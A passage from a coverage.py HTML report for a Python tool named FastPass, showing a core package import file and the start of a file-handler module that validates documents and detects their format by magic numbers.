        </aside>
        <h2>
            <span class="text">3 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">3<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_145eef247bfb46b6_cli_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ae6ae744f2ec6f26___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Core Business Logic</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">security</span> <span class="key">import</span> <span class="nam">SecurityValidator</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">file_handler</span> <span class="key">import</span> <span class="nam">FileValidator</span><span class="op">,</span> <span class="nam">FileProcessor</span><span class="op">,</span> <span class="nam">ResultsReporter</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="nam">__all__</span> <span class="op">=</span> <span class="op">[</span><span class="str">'SecurityValidator'</span><span class="op">,</span> <span class="str">'FileValidator'</span><span class="op">,</span> <span class="str">'FileProcessor'</span><span class="op">,</span> <span class="str">'ResultsReporter'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_145eef247bfb46b6_cli_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ae6ae744f2ec6f26___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ce21df766c911d41_file_handler_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\file_handler.py: 82%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\file_handler.py</b>:
            <span class="pc_cov">82%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">251 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">206<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">45<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ae6ae744f2ec6f26_pdf_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_9d0a8317fb892e58___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass File Handler Module</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: Section B3a-B6h File Validation and Section D File Processing</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">filetype</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">tempfile</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">import</span> <span class="nam">shutil</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">import</span> <span class="nam">hashlib</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">import</span> <span class="nam">os</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span><span class="op">,</span> <span class="nam">Optional</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="key">from</span> <span class="nam">dataclasses</span> <span class="key">import</span> <span class="nam">dataclass</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="key">from</span> <span class="nam">datetime</span> <span class="key">import</span> <span class="nam">datetime</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t"><span class="key">from</span> <span class="nam">utils</span><span class="op">.</span><span class="nam">config</span> <span class="key">import</span> <span class="nam">FastPassConfig</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="com"># Custom Exception Classes</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="key">class</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">    <span class="str">"""Raised when file format validation fails"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t"><span class="key">class</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">    <span class="str">"""Raised when file processing fails"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t"><span class="op">@</span><span class="nam">dataclass</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t"><span class="key">class</span> <span class="nam">FileManifest</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t"><span class="str">    B6a: Create FileManifest Object</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t"><span class="str">    Data structure to hold file metadata and processing information</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">    <span class="nam">path</span><span class="op">:</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">    <span class="nam">format</span><span class="op">:</span> <span class="nam">str</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">    <span class="nam">size</span><span class="op">:</span> <span class="nam">int</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">    <span class="nam">is_encrypted</span><span class="op">:</span> <span class="nam">bool</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">    <span class="nam">crypto_tool</span><span class="op">:</span> <span class="nam">str</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">    <span class="nam">security_checked</span><span class="op">:</span> <span class="nam">bool</span> <span class="op">=</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">    <span class="nam">access_verified</span><span class="op">:</span> <span class="nam">bool</span> <span class="op">=</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t"><span class="key">class</span> <span class="nam">FileValidator</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t"><span class="str">    File format validation and detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t"><span class="str">    Maps to B3a-B6h from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">,</span> <span class="nam">config</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">config</span> <span class="op">=</span> <span class="nam">config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">max_file_size</span> <span class="op">=</span> <span class="nam">config</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="str">'max_file_size'</span><span class="op">,</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">MAX_FILE_SIZE</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">    <span class="key">def</span> <span class="nam">validate_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">FileManifest</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t"><span class="str">        B3a-B6e: Complete file validation pipeline</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t"><span class="str">        Validate file format, content, and create manifest</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">        <span class="com"># B1f: Verify File Actually Exists</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">File not found: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">is_file</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Path is not a file: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">        <span class="com"># B3a-B3e: Enhanced File Format Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">        <span class="nam">file_format</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_detect_file_format</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">        <span class="com"># B4a-B4d: File Access and Size Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_validate_file_access_and_size</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">        <span class="com"># B5a-B5c: Encryption Status Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">        <span class="nam">is_encrypted</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_detect_encryption_status</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="nam">file_format</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">        <span class="com"># B6a-B6e: Build File Manifest</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">        <span class="nam">manifest</span> <span class="op">=</span> <span class="nam">FileManifest</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">            <span class="nam">path</span><span class="op">=</span><span class="nam">file_path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">            <span class="nam">format</span><span class="op">=</span><span class="nam">file_format</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">            <span class="nam">size</span><span class="op">=</span><span class="nam">file_path</span><span class="op">.</span><span class="nam">stat</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">st_size</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">            <span class="nam">is_encrypted</span><span class="op">=</span><span class="nam">is_encrypted</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">            <span class="nam">crypto_tool</span><span class="op">=</span><span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">[</span><span class="nam">file_format</span><span class="op">]</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">            <span class="nam">security_checked</span><span class="op">=</span><span class="key">True</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">            <span class="nam">access_verified</span><span class="op">=</span><span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">        <span class="com"># B6f: Log File Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Validated: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst"> (format: </span><span class="op">{</span><span class="nam">file_format</span><span class="op">}</span><span class="fst">, encrypted: </span><span class="op">{</span><span class="nam">is_encrypted</span><span class="op">}</span><span class="fst">)</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">        <span class="key">return</span> <span class="nam">manifest</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">    <span class="key">def</span> <span class="nam">_detect_file_format</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">str</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t"><span class="str">        B3b-B3e: Enhanced File Format Validation (Magic Number Priority)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t"><span class="str">        Detect file format using magic numbers with extension fallback</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">        <span class="com"># B3b: Detect Format via Magic Numbers (Primary)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">            <span class="nam">detected_type</span> <span class="op">=</span> <span class="nam">filetype</span><span class="op">.</span><span class="nam">guess</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">            <span class="key">if</span> <span class="nam">detected_type</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">                <span class="com"># Convert MIME type to extension</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">                <span class="nam">mime_to_ext</span> <span class="op">=</span> <span class="op">{</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">                    <span class="str">'application/vnd.openxmlformats-officedocument.wordprocessingml.document'</span><span class="op">:</span> <span class="str">'.docx'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">                    <span class="str">'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span><span class="op">:</span> <span class="str">'.xlsx'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">                    <span class="str">'application/vnd.openxmlformats-officedocument.presentationml.presentation'</span><span class="op">:</span> <span class="str">'.pptx'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">                    <span class="str">'application/pdf'</span><span class="op">:</span> <span class="str">'.pdf'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">                <span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">                <span class="nam">detected_ext</span> <span class="op">=</span> <span class="nam">mime_to_ext</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="nam">detected_type</span><span class="op">.</span><span class="nam">mime</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">                <span class="key">if</span> <span class="nam">detected_ext</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">                    <span class="com"># B3b_Success: Use Magic Number Result</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">                    <span class="nam">file_ext</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">suffix</span><span class="op">.</span><span class="nam">lower</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">                    <span class="key">if</span> <span class="nam">file_ext</span> <span class="op">!=</span> <span class="nam">detected_ext</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">                        <span class="com"># B3e_Mismatch: Format Mismatch</span>&nbsp;</span><span class="r"></span></p>
